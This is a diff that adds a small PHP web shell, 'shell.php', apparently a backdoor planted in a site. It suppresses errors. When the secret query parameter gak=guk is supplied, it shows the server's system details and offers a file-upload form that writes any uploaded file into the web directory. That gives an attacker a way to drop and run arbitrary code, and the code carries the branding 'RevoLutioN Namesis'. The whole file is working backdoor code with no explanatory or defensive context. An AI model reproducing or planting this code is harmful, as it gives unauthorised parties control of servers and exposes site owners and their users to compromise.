@@ -1,0 +1,14 @@
+<?php
+
+// ACCESS? shell.php?gak=guk
+
+error_reporting(0);
+@error_reporting(0);
+@session_start();
+if($_GET["gak"]=="guk"){
+echo '<b>RevoLutioN Namesis<br><br>'.php_uname().'<br></b>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {   if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Success !!!</b><br><br>'; } else { echo '<b>Upload Fail !!!</b><br><br>'; }}
+}
+
+?><form action="" method="post">
+<input type="text" name="p">
+</form>
